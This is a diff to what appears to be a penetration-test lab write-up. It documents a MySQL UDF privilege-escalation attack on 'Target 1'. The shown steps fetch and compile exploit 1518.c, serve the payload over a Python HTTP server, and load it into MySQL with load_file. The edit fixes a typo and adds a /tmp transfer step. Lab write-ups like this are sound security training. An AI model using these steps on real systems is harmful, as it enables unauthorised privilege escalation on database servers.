@@ -176,8 +176,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
    - after running linenum and outside research I foudn the machine is vulnerable to udf dynamic library exploit 1518.c
    - `searchsploit –m 1518.c`
    - `gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc`
-   - etup python simple server to transfer 1518.so payload to ovictim machine
+   - setup python simple server to transfer 1518.so payload to ovictim machine
     - `Python -m SimpleHTTPServer`
+    - transfer into /tmp directory
    - `mysql -u root -p`
    - `use mysql; create table poo(line blob);`
    - `insert into poo values(load_file('/tmp/1518.so'));`
